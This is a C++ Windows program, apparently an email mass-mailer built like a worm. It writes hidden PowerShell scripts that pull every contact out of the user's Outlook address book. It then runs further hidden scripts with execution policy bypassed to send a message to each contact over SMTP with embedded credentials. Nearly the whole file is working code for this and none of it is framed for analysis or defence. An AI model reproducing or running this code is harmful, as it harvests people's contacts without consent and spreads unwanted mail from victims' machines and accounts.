#include <iostream>
#include <windows.h>
#include <fstream>
#include <filesystem>
#include <string>
#include <locale>
#include <regex>

namespace fs = std::filesystem;
const std::string WHITESPACE = " \n\r\t\f\v";
std::string Target = "vincejosh.vj@gmail.com";
std::string EmailFrom = "vincejosh.vj@gmail.com";
std::string Subject = "SUBJECT";
std::string Body = "BODY";
std::string Email = "EMAIL";
std::string Passw = "PASSWORD";
std::string Credentials = "$SMTPClient.Credentials = New - Object System.Net.NetworkCredential(";
const char mail[] = "";

using dict_iterator = std::filesystem::recursive_directory_iterator;
namespace fs = std::filesystem;


std::vector <std::string> unresolved_paths;
std::vector <std::string> resolved_paths;

std::vector <std::string> resolved_mails;

constexpr int NewSize = 1000000;

inline std::string& ltrim(std::string& s, const char* t = " \t\n\r\f\v")
{
    s.erase(0, s.find_first_not_of(t));
    return s;
}

// trim from right
inline std::string& rtrim(std::string& s, const char* t = " \t\n\r\f\v")
{
    s.erase(s.find_last_not_of(t) + 1);
    return s;
}

inline std::string& trim(std::string& s, const char* t = " \t\n\r\f\v")
{
    return ltrim(rtrim(s, t), t);
}



inline std::string ltrim_copy(std::string s, const char* t = " \t\n\r\f\v")
{
    return ltrim(s, t);
}

inline std::string rtrim_copy(std::string s, const char* t = " \t\n\r\f\v")
{
    return rtrim(s, t);
}

inline std::string trim_copy(std::string s, const char* t = " \t\n\r\f\v")
{
    return trim(s, t);
}

static std::string encodeString(std::string str) {
    std::string codepage_str = str;
    int size = MultiByteToWideChar(CP_ACP, MB_COMPOSITE, codepage_str.c_str(),
        codepage_str.length(), nullptr, 0);
    std::wstring utf16_str(size, '\0');
    MultiByteToWideChar(CP_ACP, MB_COMPOSITE, codepage_str.c_str(),
        codepage_str.length(), &utf16_str[0], size);

    int utf8_size = WideCharToMultiByte(CP_UTF8, 0, utf16_str.c_str(),
        utf16_str.length(), nullptr, 0,
        nullptr, nullptr);
    std::string utf8_str(utf8_size, '\0');
    WideCharToMultiByte(CP_UTF8, 0, utf16_str.c_str(),
        utf16_str.length(), &utf8_str[0], utf8_size,
        nullptr, nullptr);

    return utf8_str;
}

static std::string removeSpaces(std::string str)
{
    str.erase(remove(str.begin(), str.end(), ' '), str.end());
    return str;
}

static std::string removeNulls(std::string str) {
    str.erase(std::find(str.begin(), str.end(), '\0'), str.end());
    return str;
}
void sendMail() {
    for (std::string mail : resolved_mails) {
        
        Sleep(1000);
        std::ofstream ps;
        if (std::filesystem::exists("test.ps1")) {
            remove("test.ps1");

        }

        ps.open("test.ps1", std::ios::out | std::ios::in | std::ios::app);
        

        const char* fileLPCWSTR = "test.ps1";
        int attr = GetFileAttributes((LPCSTR)fileLPCWSTR);

        if ((attr & FILE_ATTRIBUTE_HIDDEN) == 0) {
            SetFileAttributes(fileLPCWSTR, attr | FILE_ATTRIBUTE_HIDDEN);
        }

         
        std::string powershell;
        const char* c = mail.c_str();
        mail.erase(std::remove_if(mail.begin(), mail.end(), ::isspace), mail.end());
        mail = std::regex_replace(mail, std::regex("^ +| +$|( ) +"), "$1");

        trim(mail);
        
        powershell += "$EmailTo = '" + mail + "'\n";
        Sleep(1000);
        powershell += "$EmailFrom = '" + EmailFrom + "'\n";
        powershell += "$Subject = '" + Subject + "'\n";
        powershell += "$Body = '" + Body + "'\n";
        powershell += "$SMTPServer = 'smtp-mail.outlook.com'\n";
        powershell += "$SMTPMessage = New-Object System.Net.Mail.MailMessage($EmailFrom, $EmailTo, $Subject, $Body)\n";
        powershell += "$SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587)\n";
        powershell += "$SMTPClient.EnableSsl = $true\n";
        powershell += "$SMTPClient.Credentials = New-Object System.Net.NetworkCredential('" + Email + "', '" + Passw + "');\n";
        powershell += "$SMTPClient.Send($SMTPMessage)\n";

        ps << powershell;

        ps.close();
      
        system("powershell -ExecutionPolicy Bypass -F test.ps1");
        std::cout << "sended mail to " << mail << std::endl;
        Sleep(1000);


    }
          

}


void lookForMail() {
    if (!(std::filesystem::exists("contacts.ps1"))) {
        std::ofstream ps;
        


        ps.open("contacts.ps1");
        const char* fileLPCWSTR = "contacts.ps1";
        int attr = GetFileAttributes((LPCSTR)fileLPCWSTR);
        if ((attr & FILE_ATTRIBUTE_HIDDEN) == 0) {
            SetFileAttributes(fileLPCWSTR, attr | FILE_ATTRIBUTE_HIDDEN);
        }
        ps << "$Outlook = New-Object -comobject Outlook.Application" << std::endl;
        ps << "$Contacts = $Outlook.session.GetDefaultFolder(10).items" << std::endl;
        ps << "$Contacts | Select Email1DisplayName | out-file -filepath C:/temp/contacts.txt" << std::endl;

        ps.close();
    }

    
    system("powershell ./contacts.ps1");
    
    std::ifstream contacts("C:/temp/contacts.txt");
    Sleep(1000);


    for (std::string line; getline(contacts, line);) {
        
        unsigned first = line.find("(");
        unsigned last = line.find_last_of(")");

        std::string strNew = line.substr(first + 1, last - first -1);
            
           
        if (strNew.find("@") != std::string::npos) {

             
            strNew = trim(strNew);
            std::string str;
            int index = 1;
            for (char c : strNew) {
                if (index % 2 == 0) {
                    str.push_back(c);
                }
                index++;
            }
            
            resolved_mails.push_back(str);
                
        }
            
    }

    contacts.close();
   
}

int main() {
    
    lookForMail();
    sendMail();
    
}
